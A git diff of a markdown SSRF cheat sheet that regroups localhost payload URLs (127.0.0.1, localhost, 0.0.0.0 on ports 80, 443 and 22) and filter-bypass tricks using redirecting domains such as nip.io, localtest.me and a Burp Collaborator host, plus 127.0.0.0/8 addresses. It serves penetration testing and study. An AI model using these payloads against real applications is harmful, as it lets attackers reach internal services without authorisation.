@@ -64,24 +64,24 @@
 
 ## Payloads with localhost
 
-Basic SSRF v1
-
-```powershell
-http://127.0.0.1:80
-http://127.0.0.1:443
-http://127.0.0.1:22
-http://0.0.0.0:80
-http://0.0.0.0:443
-http://0.0.0.0:22
-```
-
-Basic SSRF - Alternative version
-
-```powershell
-http://localhost:80
-http://localhost:443
-http://localhost:22
-```
+* Using `localhost`
+  ```powershell
+  http://localhost:80
+  http://localhost:443
+  http://localhost:22
+  ```
+* Using `127.0.0.1`
+  ```powershell
+  http://127.0.0.1:80
+  http://127.0.0.1:443
+  http://127.0.0.1:22
+  ```
+* Using `0.0.0.0`
+  ```powershell
+  http://0.0.0.0:80
+  http://0.0.0.0:443
+  http://0.0.0.0:22
+  ```
 
 ## Bypassing filters
 
@@ -110,13 +110,11 @@ http://0000::1:3128/ Squid
 
 ### Bypass localhost with a domain redirection
 
-```powershell
-http://spoofed.burpcollaborator.net
-http://localtest.me
-http://customer1.app.localhost.my.company.127.0.0.1.nip.io
-http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
-http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
-```
+
+* `spoofed.[BURP_COLLABORATOR]` such as `spoofed.redacted.oastify.com`
+* `localtest.me` redirect to `::1`
+* `company.127.0.0.1.nip.io` redirect to `127.0.0.1`
+* `bugbounty.dod.network` redirect to `127.0.0.2`
 
 The service nip.io is awesome for that, it will convert any ip address as a dns.
 
@@ -126,7 +124,7 @@ NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, ev
 
 ### Bypass localhost with CIDR 
 
-It's a /8
+IP addresses from 127.0.0.0/8
 
 ```powershell
 http://127.127.127.127
